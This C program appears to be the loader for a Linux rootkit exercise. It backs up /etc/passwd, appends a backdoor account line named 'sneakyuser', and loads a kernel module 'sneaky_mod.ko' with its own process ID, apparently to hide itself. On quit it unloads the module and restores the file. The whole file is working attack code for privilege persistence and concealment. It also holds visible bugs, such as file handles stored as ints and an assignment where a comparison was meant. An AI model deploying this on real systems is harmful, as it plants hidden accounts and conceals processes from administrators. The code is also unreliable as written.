#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <errno.h>

int passwd();
void execute();
int attack();
void fin();

int main (int argc, char *argv[]) {
  if (attack() != 0) {
    exit(EXIT_FAILURE);
  }

  while (1) {
    printf(">>>");
    char in;
    in = getchar();
    printf("\n");
    if (in = 'q') {
      break;
    }
  }
  fin();
  return 0;
}

int passwd() {
  int fd1, fd2;
  int err;
  char c;

  fd1 = fopen("/etc/passwd", "r");
  fd2 = fopen("/tmp/passwd", "w");

  if ( (fd1 < 0) || (fd2 < 0) ) {
    printf("Error: Failed to open /.../passwd\n");
    exit(EXIT_FAILURE);
  }

  while (1) {
    c = fgetc( fd1 );
    if (c == EOF) break;
    fputc( c, fd2 );
  }
  fclose(fd1);
  fclose(fd2);

  int fd3 = fopen("/etc/passwd", "a");
  if ( fd3 < 0 ) {
    printf("Error: Failed to append /etc/passwd\n");
  }
  char str[256] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  fprintf(fd3, "%s", str);
  fclose(fd3);

  return 0;
}

void execute(char **argv) {
  pid_t pid;
  int status;
  pid = fork();
  if ( pid < 0 ) {
    printf("Error: Failed to fork()\n");
  } else if ( pid == 0 ) {
    int err = execvp(argv[0], argv);
    if (err < 0) {
      printf("Error: exec failed\n");
      exit(EXIT_FAILURE);
    }
  } else {
    while (wait(&status) != pid) {}
  }
}

int attack() {
  char *argv[4];
  char pid[16];

  if ( passwd() != 0 ) {
    return -1;
  }

  argv[0] = "insmod";
  argv[1] = "sneaky_mod.ko";
  snprintf(pid, sizeof(pid), "sneaky_pid=%d", getpid());
  argv[2] = pid;
  argv[3] = NULL;

  execute(argv);
  return 0;
}

void fin() {
  char *argv[3];

  argv[0] = "rmmod";
  argv[1] = "sneaky_mod.ko";
  argv[2] = NULL;
  execute(argv);

  int fd1, fd2;
  int err;
  char c;

  fd1 = fopen("/tmp/passwd", "r");
  fd2 = fopen("/etc/passwd", "w");

  if ( (fd1 < 0) || (fd2 < 0) ) {
    printf("Error: Failed to open /.../passwd\n");
    exit(EXIT_FAILURE);
  }

  while (1) {
    c = fgetc( fd1 );
    if (c == EOF) break;
    fputc( c, fd2 );
  }
  fclose(fd1);
  fclose(fd2);
}
